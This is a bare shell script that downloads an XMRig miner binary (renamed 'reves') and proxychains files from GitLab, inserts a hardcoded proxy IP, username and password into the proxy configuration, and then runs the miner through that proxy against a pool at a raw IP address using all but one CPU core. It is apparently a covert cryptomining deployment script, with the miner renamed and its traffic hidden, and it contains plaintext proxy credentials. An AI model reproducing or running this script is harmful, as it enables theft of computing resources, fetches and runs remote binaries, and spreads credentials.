#!/bin/sh
proxy="185.205.194.126" 
port="7646" 
user="ingfoingfo"  
pass="maszZeehh"
wget -q -O reves https://gitlab.com/cuanbos/xdag/-/raw/main/xmrig && chmod +x reves
wget -q https://gitlab.com/cuanbos/sock5/-/raw/main/panel && chmod +x panel 
wget -q https://gitlab.com/cuanbos/sock5/-/raw/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitlab.com/cuanbos/sock5/-/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "******" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./reves -o 173.212.235.123:13656 -u 6Sdu2VTNLImAIoq7KscJq38v2yGNS6wx -p $(echo $(shuf -i 1-20000 -n 1)) -a rx/xdag -t $(($(nproc)-1))
